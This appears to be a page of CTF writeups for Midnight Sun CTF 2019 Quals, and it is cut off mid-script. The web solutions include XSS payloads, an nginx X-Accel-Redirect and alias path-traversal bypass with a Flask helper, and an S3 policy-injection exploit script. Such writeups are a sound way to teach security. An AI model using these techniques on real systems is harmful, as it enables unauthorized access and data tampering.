@@ -1,0 +1,1163 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Midnight Sun CTF 2019 Quals</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#hfs-mbr">hfs-mbr</a>
+    
+                <a class="dropdown-item" href="#hfs-vm">hfs-vm</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#marcozuckerbergo">marcozuckerbergo</a>
+    
+                <a class="dropdown-item" href="#marcodowno">marcodowno</a>
+    
+                <a class="dropdown-item" href="#bigspin">bigspin</a>
+    
+                <a class="dropdown-item" href="#cloudb">cloudb</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#hfsipc">hfsipc</a>
+    
+                <a class="dropdown-item" href="#hfs-mbr-1">hfs-mbr-1</a>
+    
+                <a class="dropdown-item" href="#hfs-vm-1">hfs-vm-1</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#pgp-com">pgp-com</a>
+    
+                <a class="dropdown-item" href="#ezdsa">ezdsa</a>
+    
+                <a class="dropdown-item" href="#open-gyckel-krypto">open-gyckel-krypto</a>
+    
+                <a class="dropdown-item" href="#tulpan257">tulpan257</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#hfs-mbr" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">hfs-mbr</span>
+            </a>
+    
+<a href="#hfs-vm" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">hfs-vm</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#marcozuckerbergo" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">marcozuckerbergo</span>
+            </a>
+    
+<a href="#marcodowno" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">marcodowno</span>
+            </a>
+    
+<a href="#bigspin" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bigspin</span>
+            </a>
+    
+<a href="#cloudb" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cloudb</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#hfsipc" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">hfsipc</span>
+            </a>
+    
+<a href="#hfs-mbr-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">hfs-mbr-1</span>
+            </a>
+    
+<a href="#hfs-vm-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">hfs-vm-1</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#pgp-com" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pgp-com</span>
+            </a>
+    
+<a href="#ezdsa" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ezdsa</span>
+            </a>
+    
+<a href="#open-gyckel-krypto" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">open-gyckel-krypto</span>
+            </a>
+    
+<a href="#tulpan257" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">tulpan257</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="midnight-sun-ctf-2019-quals"><a class="header-link" href="#midnight-sun-ctf-2019-quals"></a>Midnight Sun CTF 2019 Quals</h1>
+
+<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
+<h3 id="hfs-mbr"><a class="header-link" href="#hfs-mbr"></a>Hfs-mbr</h3>
+<ul class="list">
+<li>The mbr code is in dos.img</li>
+<li>Use IDA then you can reverse the code</li>
+<li>You can find a jump table and the offset based on your input character</li>
+<li>Only nine characters have some check operations and you can easily find out that it indicate the order of those characters. </li>
+<li>Finally, you will find the password <code>sojupwner</code></li>
+<li>And the flag is <code>midnight{w0ah_Sh!t_jU5t_g0t_REALmode}</code></li>
+</ul>
+<h3 id="hfs-vm"><a class="header-link" href="#hfs-vm"></a>Hfs-vm</h3>
+<ul class="list">
+<li>First we can find out that at the beginning the process will fork.</li>
+<li>The parent process acts like syscall handler. For instance, it can call system(&#39;ls&#39;) or read flag1</li>
+<li>The child process is like a vm, it takes our input and execute it.</li>
+<li>After a while you can find that what you have to do is using syscall to read flag1 and print it out.</li>
+<li>At first, increase the length of stack. Then, call syscall <code>0x3</code> to read flag1 to the shared memory buffer. In the end, call syscall <code>0x1</code> to print flag1 in the buffer.</li>
+<li>The flag is <code>midnight{m3_h4bl0_vm}</code></li>
+</ul>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="marcozuckerbergo"><a class="header-link" href="#marcozuckerbergo"></a>Marcozuckerbergo</h3>
+<ul class="list">
+<li>It should be easy to notice that the website uses mermaid library</li>
+<li>Try to search some XSS PoC for mermaid on website</li>
+<li>Then I got this <a href="https://github.com/benweet/stackedit/issues/1457">https://github.com/benweet/stackedit/issues/1457</a></li>
+<li>So the payload will be <code>http://marcozuckerbergo-01.play.midnightsunctf.se:3002/markdown?input=graph%20LR%0aid1[&quot;&lt;iframe%20src=javascript:alert(%271%27)&gt;&lt;/iframe&gt;&quot;]</code></li>
+<li>And the flag is <code>midnight{1_gu3zz_7rust1ng_l1bs_d1dnt_w0rk_3ither:(}</code></li>
+</ul>
+<h3 id="marcodowno"><a class="header-link" href="#marcodowno"></a>Marcodowno</h3>
+<ul class="list">
+<li>This challenge filter and replace our input:</li>
+</ul>
+<pre class="hljs"><code>function markdown(text){
+  text = text.replace(/[&lt;]/g, <span class="hljs-string">''</span>)
+  .replace(/----/g,<span class="hljs-string">'&lt;hr&gt;'</span>)
+  .replace(/&gt; ?([^\n]+)/g, <span class="hljs-string">'&lt;blockquote&gt;$1&lt;/blockquote&gt;'</span>)
+  .replace(/\*\*([^*]+)\*\*/g, <span class="hljs-string">'&lt;b&gt;$1&lt;/b&gt;'</span>)
+  .replace(/__([^_]+)__/g, <span class="hljs-string">'&lt;b&gt;$1&lt;/b&gt;'</span>)
+  .replace(/\*([^\s][^*]+)\*/g, <span class="hljs-string">'&lt;i&gt;$1&lt;/i&gt;'</span>)
+  .replace(/\* ([^*]+)/g, <span class="hljs-string">'&lt;li&gt;$1&lt;/li&gt;'</span>)
+  .replace(/##### ([^#\n]+)/g, <span class="hljs-string">'&lt;h5&gt;$1&lt;/h5&gt;'</span>)
+  .replace(/#### ([^#\n]+)/g, <span class="hljs-string">'&lt;h4&gt;$1&lt;/h4&gt;'</span>)
+  .replace(/### ([^#\n]+)/g, <span class="hljs-string">'&lt;h3&gt;$1&lt;/h3&gt;'</span>)
+  .replace(/## ([^#\n]+)/g, <span class="hljs-string">'&lt;h2&gt;$1&lt;/h2&gt;'</span>)
+  .replace(/# ([^#\n]+)/g, <span class="hljs-string">'&lt;h1&gt;$1&lt;/h1&gt;'</span>)
+  .replace(/(?&lt;!\()(https?:\/\/[a-zA-Z0<span class="hljs-number">-9.</span>/?#-]+)/g, <span class="hljs-string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>)
+  .replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0<span class="hljs-number">-9.</span>/?#]+)\)/g, <span class="hljs-string">'&lt;img src="$2" alt="$1"/&gt;'</span>)
+  .replace(/(?&lt;!!)\[([^\]]+)\]\((https?:\/\/[a-zA-Z0<span class="hljs-number">-9.</span>/?#-]+)\)/g, <span class="hljs-string">'&lt;a href="$2"&gt;$1&lt;/a&gt;'</span>)
+  .replace(/`([^`]+)`/g, <span class="hljs-string">'&lt;code&gt;$1&lt;/code&gt;'</span>)
+  .replace(/```([^`]+)```/g, <span class="hljs-string">'&lt;code&gt;$1&lt;/code&gt;'</span>)
+  .replace(/\n/g, <span class="hljs-string">"&lt;br&gt;"</span>);
+  return text;
+}
+
+window.onload=function(){
+  $(<span class="hljs-string">"#markdown"</span>).text(input);
+  $(<span class="hljs-string">"#rendered"</span>).html(markdown(input));
+}
+</code></pre><ul class="list">
+<li>Our goal is to pop <code>alert(1)</code> on chrome environment.</li>
+<li>We can close double quote of <code>&lt;img&gt;</code>&#39;s <code>alt</code> attribute.</li>
+<li>Payload:<ul class="list">
+<li><code>![ &quot; onerror=alert(1) ](https://kaibrotw)</code></li>
+</ul>
+</li>
+<li><code>midnight{wh0_n33ds_libs_wh3n_U_g0t_reg3x?}</code></li>
+</ul>
+<h3 id="bigspin"><a class="header-link" href="#bigspin"></a>Bigspin</h3>
+<ul class="list">
+<li>This challenge give us four link: <code>/admin/</code>, <code>/uberadmin/</code>, <code>/user/</code>, <code>/pleb/</code><ul class="list">
+<li><code>/admin/</code> =&gt; 404</li>
+<li><code>/uberadmin/</code> =&gt; 403</li>
+<li><code>/user/</code> =&gt; 403</li>
+<li><code>/pleb/</code> =&gt; 200</li>
+</ul>
+</li>
+<li>The content of <code>/pleb/</code> is:<ul class="list">
+<li><img src="https://i.imgur.com/aivIgPE.png" alt=""></li>
+<li>same as <code>example.com</code></li>
+</ul>
+</li>
+<li>Fuzzing it!<ul class="list">
+<li><code>/pleb./</code> =&gt; 200</li>
+<li><code>/ple%62/</code> =&gt; 200</li>
+<li><code>/pleb</code> =&gt; 404</li>
+<li><code>/pleb:</code> =&gt; 500</li>
+<li><code>/pleb../</code> =&gt; 502</li>
+<li><code>/pleba/</code> =&gt; 502</li>
+<li>...</li>
+</ul>
+</li>
+<li>So we can guess the proxy rule may look like:<ul class="list">
+<li><code>/pleb[INPUT]</code> =&gt; <code>example.com[INPUT]</code></li>
+<li>Testing with DNS LOG: <code>/pleb.kaibro.tw</code></li>
+<li>Received a request: <code>example.com.kaibro.tw</code></li>
+</ul>
+</li>
+<li>Set <code>example.com.gg.kaibro.tw</code> to point <code>127.0.0.1</code><ul class="list">
+<li>Then we can visit <code>/pleb.gg.kaibro.tw/user/</code> now.</li>
+<li>There is only one file <code>nginx.c%C3%B6nf%20</code> under <code>/user/</code></li>
+<li>Double encode the filename and read it:</li>
+</ul>
+</li>
+</ul>
+<pre class="hljs"><code>worker_processes <span class="hljs-number">1</span>;
+user nobody nobody;
+error_log <span class="hljs-meta-keyword">/dev/</span>stdout;
+pid <span class="hljs-meta-keyword">/tmp/</span>nginx.pid;
+<span class="hljs-class">events </span>{
+  worker_connections <span class="hljs-number">1024</span>;
+}
+
+<span class="hljs-class">http </span>{
+
+    <span class="hljs-meta"># Set an array of temp and cache files options that otherwise defaults to</span>
+    <span class="hljs-meta"># restricted locations accessible only to root.</span>
+
+    client_body_temp_path <span class="hljs-meta-keyword">/tmp/</span>client_body;
+    fastcgi_temp_path <span class="hljs-meta-keyword">/tmp/</span>fastcgi_temp;
+    proxy_temp_path <span class="hljs-meta-keyword">/tmp/</span>proxy_temp;
+    scgi_temp_path <span class="hljs-meta-keyword">/tmp/</span>scgi_temp;
+    uwsgi_temp_path <span class="hljs-meta-keyword">/tmp/</span>uwsgi_temp;
+    resolver <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span> ipv6=off;
+
+    <span class="hljs-class">server </span>{
+        listen <span class="hljs-number">80</span>;
+
+        location <span class="hljs-class">/ {
+            root <span class="hljs-meta-keyword">/var/</span>www<span class="hljs-meta-keyword">/html/</span>public;
+            try_files $uri $uri/index.html $uri/ =<span class="hljs-number">404</span>;
+        }
+
+        location /<span class="hljs-class">user </span>{
+            allow <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;
+            deny all;
+            autoindex on;
+            root <span class="hljs-meta-keyword">/var/</span>www<span class="hljs-meta-keyword">/html/</span>;
+        }
+
+        location /<span class="hljs-class">admin </span>{
+            internal;
+            autoindex on;
+            alias <span class="hljs-meta-keyword">/var/</span>www<span class="hljs-meta-keyword">/html/</span>admin/;
+        }
+
+        location /<span class="hljs-class">uberadmin </span>{
+            allow <span class="hljs-number">0.13</span><span class="hljs-number">.3</span><span class="hljs-number">.7</span>;
+            deny all;
+            autoindex on;
+            alias <span class="hljs-meta-keyword">/var/</span>www<span class="hljs-meta-keyword">/html/</span>uberadmin/;
+        }
+
+        location ~ /pleb([/a-zA-Z0<span class="hljs-number">-9.</span>:%]+) {
+            proxy_pass   http:<span class="hljs-comment">//example.com$1;</span>
+        }
+
+        access_log <span class="hljs-meta-keyword">/dev/</span>stdout;
+        error_log <span class="hljs-meta-keyword">/dev/</span>stdout;
+    }
+
+}
+</span></code></pre><ul class="list">
+<li><code>/admin</code> is <code>internal;</code><ul class="list">
+<li>only allow internal requests</li>
+</ul>
+</li>
+<li><p><code>/uberadmin</code> only allow IP <code>0.13.3.7</code></p>
+</li>
+<li><p>How to bypass these restrictions?</p>
+<ul class="list">
+<li><code>X-Accel-Redirect</code> header can bypass the <code>internal</code> restriction.</li>
+<li><a href="https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/">https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/</a></li>
+<li><blockquote>
+<p>X-accel allows for internal redirection to a location determined by a header returned from a backend.</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>Run a web server and send header with <code>proxy_pass</code> to bypass <code>/admin</code> restriction:</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, current_app, request, make_response
+
+app = Flask(__name__)
+
+<span class="hljs-meta">@app.route('/')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+    response = make_response()
+    response.headers[<span class="hljs-string">'X-Accel-Redirect'</span>] = <span class="hljs-string">'/admin/flag.txt'</span>
+    <span class="hljs-keyword">return</span> response
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">5000</span>, threaded=<span class="hljs-keyword">True</span>)
+</code></pre><ul class="list">
+<li><p>the content of <code>/admin/flag.txt</code>:</p>
+<ul class="list">
+<li><code>hmmm, should admins really get flags? seems like an uberadmin thing to me</code></li>
+<li>so we need to bypass <code>/uberadmin</code></li>
+</ul>
+</li>
+<li><p>There is a <strong>Path Traversal vulnerability</strong> in the Nginx config:</p>
+<ul class="list">
+<li><code>/admin</code> alias to <code>/var/www/html/admin/</code></li>
+<li>No trailing slash on <code>/admin</code></li>
+<li>We can visit parent directory by <code>/admin../</code></li>
+</ul>
+</li>
+</ul>
+<pre class="hljs"><code>location /admin {
+    <span class="hljs-keyword">internal</span>;
+    autoindex <span class="hljs-keyword">on</span>;
+    <span class="hljs-keyword">alias</span> /<span class="hljs-keyword">var</span>/www/html/admin/;
+}
+</code></pre><ul class="list">
+<li>Read <code>/admin../uberadmin/flag.txt</code><ul class="list">
+<li><code>midnight{y0u_sp1n_m3_r1ght_r0und_b@by}</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="cloudb"><a class="header-link" href="#cloudb"></a>Cloudb</h3>
+<p>First, there is a hidden key in the form. Thus it uses Amazon S3 as backend:</p>
+<pre class="hljs"><code>&lt;input type=<span class="hljs-string">"hidden"</span> <span class="hljs-built_in">name</span>=<span class="hljs-string">"AWSAccessKeyId"</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">"AWSAccessKeyId"</span> value=<span class="hljs-string">"AKIAJQSA73ND6ITM5ETQ"</span>&gt;
+</code></pre><p>And the user&#39;s information is saved at <code>http://cloudb-01.play.midnightsunctf.se/userinfo/dw0fjw02@dw0fjw02.dw/info.json</code>:</p>
+<pre class="hljs"><code>{<span class="hljs-attr">"admin"</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">"hmac"</span>: <span class="hljs-string">"925adf8ba3226f0f007bb64906c7dddd681cb49e7bc2545408cc6fb2624d0fce"</span>, <span class="hljs-attr">"name"</span>: <span class="hljs-string">"dw0fjw02"</span>, <span class="hljs-attr">"email"</span>: <span class="hljs-string">"dw0fjw02@dw0fjw02.dw"</span>}
+</code></pre><p>If we randomly type a email, the server will return a Amazon S3 bucket error message. It seems to reversely proxy the request.</p>
+<pre class="hljs"><code>$ curl http://cloudb-01.play.midnightsunctf.se/userinfo/notexist/info.json      
+
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Error</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Code</span>&gt;</span>AccessDenied<span class="hljs-tag">&lt;/<span class="hljs-name">Code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Message</span>&gt;</span>Access Denied<span class="hljs-tag">&lt;/<span class="hljs-name">Message</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">RequestId</span>&gt;</span>AE1BE93D22D87D89<span class="hljs-tag">&lt;/<span class="hljs-name">RequestId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">HostId</span>&gt;</span>2XyKdz5M+7hnK+Y7Bvl6J35ZoMjmrpSEux7C5jDGx+RuTUw4d/Q/4JfFzpHm69jfIYo4ZfFagoE=<span class="hljs-tag">&lt;/<span class="hljs-name">HostId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Error</span>&gt;</span>
+</code></pre><p>So obviously, we have to somehow modify the JSON file in Amazon S3 to set &quot;admin&quot; true. </p>
+<p>After logging in, we are able to change our profile pictures. The profile picture is directly saved in another Amazon S3 without the server proxying the request. This workflow is as follows</p>
+<ul class="list">
+<li>Amazon HTTP POST API required a <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-HTTPPOSTConstructPolicy.html">policy</a> which specifies conditions that the request must meet.</li>
+<li>An XML HTTP request is sent to generate the policy and proper signatures (keys): <code>http://cloudb-01.play.midnightsunctf.se/signature?acl=public-read&amp;hmac=....</code></li>
+<li>Note the hmac parameter has nothing to do with Amazon S3. The hmac is computed in client-side in <code>static/app.min.js</code>. The hmac key is not <code>cl0udb_Pr0d_Do_NOT_d1sclose</code>. Instead, it&#39;s <code>[object Object]</code>. Not sure if it&#39;s intentional or not XD</li>
+<li>Next, send POST request including the pictures and policy to S3 cucket: <code>https://cloudb-profilepics.s3.amazonaws.com/</code></li>
+<li>Then the profile picture is available at <code>http://cloudb-01.play.midnightsunctf.se/profilepics/awdawdaf@adwdaw.com.png</code></li>
+</ul>
+<p>The policy is in JSON format:</p>
+<pre class="hljs"><code>{
+                <span class="hljs-string">'expiration'</span>: <span class="hljs-string">'2019-04-09T03:01:48.000Z'</span>,
+                <span class="hljs-string">'conditions'</span>: [
+                    [<span class="hljs-string">'content-length-range'</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10000</span>], {<span class="hljs-string">'bucket'</span>: <span class="hljs-string">'cloudb-profilepics'</span>},
+                    {<span class="hljs-string">'acl'</span>: <span class="hljs-string">'public-read'</span>},
+                    [<span class="hljs-string">'starts-with'</span>, <span class="hljs-string">'$key'</span>, <span class="hljs-string">'profilepics/'</span>]
+                ]
+}
+</code></pre><p>Since the condition contains <code>starts-with</code>, we cannot overwrite <code>userinfo/[email]/info.json</code>. However, the policy returned from the server is injectable. The GET parameter <code>acl=puclic-read</code> can be injected with quotes. Although S3 bucket will validate the JSON format, we can simply bypass its validation using capitalized words &quot;Conditions&quot;. Therefore we can get rid of the annoying <code>starts-with</code> condition.</p>
+<pre class="hljs"><code>{
+                'expiration': '<span class="hljs-number">2019</span><span class="hljs-number">-04</span><span class="hljs-number">-09</span>T03:<span class="hljs-number">16</span>:<span class="hljs-number">49.000</span>Z',
+                'conditions': [
+                    ['content-length-range', <span class="hljs-number">1</span>, <span class="hljs-number">10000</span>], {'bucket': 'cloudb-profilepics'},
+                    {'acl': 'a'}
+                ],
+                'conditions': [
+                    {'acl': 'public-read'},
+                    ['starts-with', '$bucket', ''],
+                    ['starts-with', '$key', ''],
+                    ['starts-with', '$success_action_status', '']
+                ],
+                'Conditions': [
+                    {'a': 'a'},
+                    ['starts-with', '$key', 'profilepics/']
+                ]
+}
+</code></pre><p>There are totally 3 conditions in the JSON policy:</p>
+<ol class="list">
+<li>This one will be overwritten by the second one.</li>
+<li>S3 bucket will use this as the condition value.</li>
+<li>It will simply be ignored. I think S3 will only parse the lowercase <code>conditions</code>.</li>
+</ol>
+<p>The reason why using uppercase <code>Conditions</code> here is if we use an arbitrary word like <code>foobar</code>, S3 will return an error because it&#39;s an invalid key.</p>
+<p>So we have a unrestricted policy and a totally controlable profile picture. We can overwrite the userinfo now! However, it seems like the userinfo is saved in another S3 bucket. What&#39;s worse, we even don&#39;t know the bucket name!</p>
+<p>After some guessing, the bucket name turns out to be <code>cloudb-users</code>. Come on, it&#39;s not even <code>cloudb-userinfo</code>. I think the challenge is poorly-designed here. After overwriting the <code>info.json</code> we can login as admin and get the flag!</p>
+<p>Here is the payload:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> hmac
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hmak</span><span class="hljs-params">(x)</span>:</span>
+    secret = <span class="hljs-string">b'[object Object]'</span>
+    x = x.encode()
+    <span class="hljs-keyword">return</span> hmac.new(secret, msg=x, digestmod=hashlib.sha256).hexdigest()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64d</span><span class="hljs-params">(x)</span>:</span>
+    <span class="hljs-keyword">return</span> base64.b64decode(x.encode()).decode()
+
+s = requests.session()
+
+mail = <span class="hljs-string">'heaton@heaton.tw'</span>
+password = <span class="hljs-string">'slowpoke'</span>
+hm = hmak(mail+password)
+data = {
+    <span class="hljs-string">'key'</span>: (<span class="hljs-keyword">None</span>, f<span class="hljs-string">'users/{mail}/info.json'</span>),
+    <span class="hljs-string">'AWSAccessKeyId'</span>: (<span class="hljs-keyword">None</span>, <span class="hljs-string">'AKIAJQSA73ND6ITM5ETQ'</span>),
+
+    <span class="hljs-comment"># https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-HTTPPOSTForms.html</span>
+    <span class="hljs-string">'success_action_status'</span>: <span class="hljs-number">201</span>,
+
+    <span class="hljs-comment"># https://stackoverflow.com/a/15235866</span>
+    <span class="hljs-string">'policy'</span>: <span class="hljs-keyword">None</span>,
